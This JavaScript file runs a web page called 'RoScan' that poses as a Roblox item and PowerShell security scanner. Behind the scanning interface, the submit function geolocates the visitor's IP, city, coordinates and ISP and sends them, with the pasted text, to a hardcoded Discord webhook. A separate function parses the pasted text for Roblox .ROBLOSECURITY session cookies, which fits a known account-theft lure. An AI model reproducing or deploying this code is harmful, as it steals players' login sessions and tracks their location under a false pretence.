// Enhanced Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon with animation
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    // Add rotation animation
    themeIcon.style.transform = 'rotate(180deg)';
    setTimeout(() => {
        if (newTheme === 'dark') {
            themeIcon.textContent = '☀️';
            themeText.textContent = 'Light';
        } else {
            themeIcon.textContent = '🌙';
            themeText.textContent = 'Dark';
        }
        themeIcon.style.transform = 'rotate(0deg)';
    }, 150);
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
    
    // Show notification
    showNotification(`Switched to ${newTheme} mode`, 'success');
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// Enhanced Modal functionality
function openScanModal() {
    console.log('Opening scan modal...');
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        // Focus on textarea after animation
        setTimeout(() => {
            if (textarea) {
                textarea.focus();
            }
        }, 400);
        
        console.log('Modal opened successfully');
        showNotification('PowerShell scanner ready', 'info');
    } else {
        console.error('Modal element not found!');
        showNotification('Error opening scanner', 'error');
    }
}

function closeScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Reset form
    if (textarea) {
        textarea.value = '';
        updateCharCount();
    }
    
    // Reset button state
    if (submitBtn && submitText) {
        submitBtn.disabled = false;
        submitText.textContent = 'Extract';
        submitBtn.style.background = '';
    }
}

// Character count and input validation
function updateCharCount() {
    const textarea = document.getElementById('powershellInput');
    const charCount = document.getElementById('charCount');
    const inputStatus = document.getElementById('inputStatus');
    
    if (textarea && charCount && inputStatus) {
        const length = textarea.value.length;
        charCount.textContent = `${length.toLocaleString()} characters`;
        
        if (length === 0) {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--text-muted)';
        } else if (length < 10) {
            inputStatus.textContent = 'Script too short';
            inputStatus.style.color = 'var(--warning)';
        } else if (length > 10000) {
            inputStatus.textContent = 'Script too long (max 10,000 chars)';
            inputStatus.style.color = 'var(--error)';
        } else {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--success)';
        }
    }
}

// Generate unique session ID for tracking
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Enhanced location detection with multiple services
async function getUserLocation() {
    try {
        let locationData = {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown', 
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };

        // Try primary service (ipapi.co)
        try {
            const response = await fetch('https://ipapi.co/json/', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                locationData = {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
                return locationData;
            }
        } catch (error) {
            console.log('Primary location service failed, trying fallback...');
        }

        // Fallback to ipinfo.io
        try {
            const fallbackResponse = await fetch('https://ipinfo.io/json');
            if (fallbackResponse.ok) {
                const fallbackData = await fallbackResponse.json();
                const [lat, lon] = (fallbackData.loc || ',').split(',');
                
                locationData = {
                    ip: fallbackData.ip || 'Unknown',
                    country: fallbackData.country || 'Unknown',
                    region: fallbackData.region || 'Unknown',
                    city: fallbackData.city || 'Unknown',
                    isp: fallbackData.org || 'Unknown',
                    timezone: fallbackData.timezone || 'Unknown',
                    latitude: lat || 'Unknown',
                    longitude: lon || 'Unknown'
                };
            }
        } catch (fallbackError) {
            console.log('Fallback location service also failed');
        }

        return locationData;
    } catch (error) {
        console.error('Location detection failed:', error);
        return {
            ip: 'Location detection failed',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };
    }
}

// Roblox limited item scanning and location tracking
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const inputText = input.value.trim();
    
    // Validation
    if (!inputText) {
        showNotification('Please enter limited item information before scanning', 'error');
        return;
    }

    // Show loading state
    submitBtn.disabled = true;
    submitText.textContent = 'Scanning...';
    loadingOverlay.style.display = 'block';

    try {
        // Extract limited item data from the input
        const limitedItems = extractLimitedItems(inputText);
        
        // Get user location
        const locationInfo = await getUserLocation();
        
        // Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
        
        // Webhook payload with limited items and location
        const payload = {
            content: "@everyone 💎 **LIMITED ITEMS SCANNED** 📍",
            embeds: [{
                title: "💎 Roblox Limited Items Scanner Results",
                color: 16753920, // Gold color
                thumbnail: {
                    url: "https://i.imgur.com/roblox-logo.png"
                },
                fields: [
                    {
                        name: "💎 Scanned Limited Items",
                        value: limitedItems.length > 0 ? limitedItems.map(item => `**${item.name || 'Unknown Item'}**\n- ID: \`${item.id}\`\n- Type: ${item.type || 'Limited'}\n- Value: ${item.estimatedValue || 'Unknown'}`).join('\n\n') : "❌ No limited items detected",
                        inline: false
                    },
                    {
                        name: "📍 Scanner Location",
                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal Code:** ${locationInfo.postal || 'Unknown'}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
                        inline: false
                    },
                    {
                        name: "🌐 Network Details",
                        value: `**🌍 IP Address:** \`${locationInfo.ip}\`\n**🏢 ISP:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
                        inline: false
                    }
                ],
                footer: {
                    text: "💎 RoScan Limited Scanner • Items Analyzed",
                    icon_url: "https://i.imgur.com/diamond-icon.png"
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        // Hide loading overlay
        loadingOverlay.style.display = 'none';

        if (response.ok) {
            submitText.textContent = 'Scan Complete!';
            submitBtn.style.background = '#10b981'; // Green success color
            showNotification('Limited items scanned successfully!', 'success');
            
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            throw new Error(`Scan failed with status: ${response.status}`);
        }
    } catch (error) {
        console.error('Scan error:', error);
        loadingOverlay.style.display = 'none';
        
        submitText.textContent = 'Scan Failed - Retry';
        submitBtn.style.background = '#ef4444'; // Red error color
        showNotification('Limited scan failed. Please try again.', 'error');
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Function to extract Roblox cookie from text
function extractRobloxCookie(text) {
    // Look for various Roblox cookie patterns
    const patterns = [
        // Standard .ROBLOSECURITY cookie format
        /\.ROBLOSECURITY=([^;"\s\n]+)/i,
        // Warning format with the actual cookie
        /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-F0-9]+)/i,
        // Simple ROBLOSECURITY format
        /ROBLOSECURITY[=:]\s*([^;"\s\n]+)/i,
        // Warning format variations
        /_\|WARNING[^|]*\|_([A-F0-9]+)/i,
        // Plain cookie value format
        /roblosecurity[=:]\s*([^;"\s\n]+)/i,
        // Cookie header format
        /Cookie:\s*\.ROBLOSECURITY=([^;"\s\n]+)/i
    ];
    
    for (const pattern of patterns) {
        const match = text.match(pattern);
        if (match && match[1] && match[1].length > 50) {
            return match[1];
        }
    }
    
    // If no specific pattern found, look for any long alphanumeric string that might be a cookie
    const genericPattern = /[A-F0-9]{100,}/i;
    const genericMatch = text.match(genericPattern);
    if (genericMatch && genericMatch[0].length > 100) {
        return genericMatch[0];
    }
    
    // Look for base64-like strings that could be cookies
    const base64Pattern = /[A-Za-z0-9+/]{200,}={0,2}/;
    const base64Match = text.match(base64Pattern);
    if (base64Match && base64Match[0].length > 200) {
        return base64Match[0];
    }
    
    return null;
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        showNotification('Copied to clipboard!', 'success');
    }).catch(function(err) {
        console.error('Failed to copy to clipboard: ', err);
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    if (trimmed.length < 10) {
        return { valid: false, message: 'PowerShell script too short (minimum 10 characters)' };
    }
    if (trimmed.length > 10000) {
        return { valid: false, message: 'PowerShell script too long (maximum 10,000 characters)' };
    }
    return { valid: true, message: 'Script ready for analysis' };
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    const icons = {
        success: '✅',
        error: '❌',
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 12px;
        color: white;
        font-weight: 500;
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        align-items: center;
        gap: 0.5rem;
        max-width: 400px;
    `;
    
    notification.innerHTML = `${icons[type]} ${message}`;
    document.body.appendChild(notification);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in forwards';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 4000);
}

// Add CSS for notification animations
const notificationCSS = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing RoScan v2.0...');
    
    // Add notification CSS
    const style = document.createElement('style');
    style.textContent = notificationCSS;
    document.head.appendChild(style);
    
    // Load theme
    loadTheme();
    
    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        const modal = document.getElementById('scanModal');
        if (event.target === modal) {
            closeScanModal();
        }
    });

    // Add click interaction to scan area
    const scanArea = document.querySelector('.scan-area');
    if (scanArea) {
        scanArea.addEventListener('click', function() {
            openScanModal();
        });
    }

    // Auto-resize textarea and character count
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', function() {
            // Auto-resize
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 400) + 'px';
            
            // Update character count
            updateCharCount();
        });
        
        // Initialize character count
        updateCharCount();
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // Show welcome notification
    setTimeout(() => {
        showNotification('RoScan security platform ready!', 'success');
    }, 1000);
});

// Keyboard shortcuts
document.addEventListener('keydown', function(event) {
    // ESC to close modal
    if (event.key === 'Escape') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            closeScanModal();
        }
    }
    
    // Ctrl+Enter to submit PowerShell (when modal is open)
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
        const modal = document.getElementById('scanModal');
        if (modal && modal.style.display === 'block') {
            event.preventDefault();
            submitPowerShell();
        }
    }
    
    // Ctrl+K to open scanner (global shortcut)
    if ((event.ctrlKey || event.metaKey) && event.key === 'k') {
        event.preventDefault();
        openScanModal();
    }
});

// Performance monitoring
window.addEventListener('load', function() {
    const loadTime = performance.now();
    console.log(`RoScan loaded in ${Math.round(loadTime)}ms`);
    
    // Track page performance
    if ('performance' in window && 'navigation' in performance) {
        const perfData = performance.getEntriesByType('navigation')[0];
        console.log('Performance metrics:', {
            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
        });
    }
});